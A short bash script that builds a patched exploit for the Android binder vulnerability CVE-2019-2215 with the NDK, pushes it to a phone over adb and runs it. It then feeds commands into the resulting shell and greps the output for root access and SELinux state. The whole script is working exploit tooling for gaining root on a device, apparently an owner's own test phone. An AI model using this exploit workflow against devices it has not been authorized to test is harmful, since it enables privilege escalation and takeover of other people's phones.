#!/bin/bash
# Build the patched exploit at the current DELAY and test it.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)
D=$(grep -oP 'define DELAY \K\d+' exploit/include/cve_2019_2215.h)
echo "### DELAY=$D, patched sources"

${NDK}ndk-build -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
    APP_PLATFORM=android-28 APP_ABI=arm64-v8a 2>&1 | tail -2

timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

printf 'id\ncat /proc/self/attr/current\ngetenforce\nblockdev --getsize64 /dev/block/bootdevice/by-name/nvme 2>&1\n' \
  | timeout 200 adb shell /data/local/tmp/cve-2019-2215 > /tmp/patched25.out 2>&1

echo
echo "=== root? ==="
grep -c "uid=0(root)" /tmp/patched25.out
echo
echo "=== SELinux result ==="
grep -nE "SID|forced|Could not load|context|Enforcing|Permissive" /tmp/patched25.out | tail -12
echo
echo "=== what the shell reported ==="
tail -6 /tmp/patched25.out
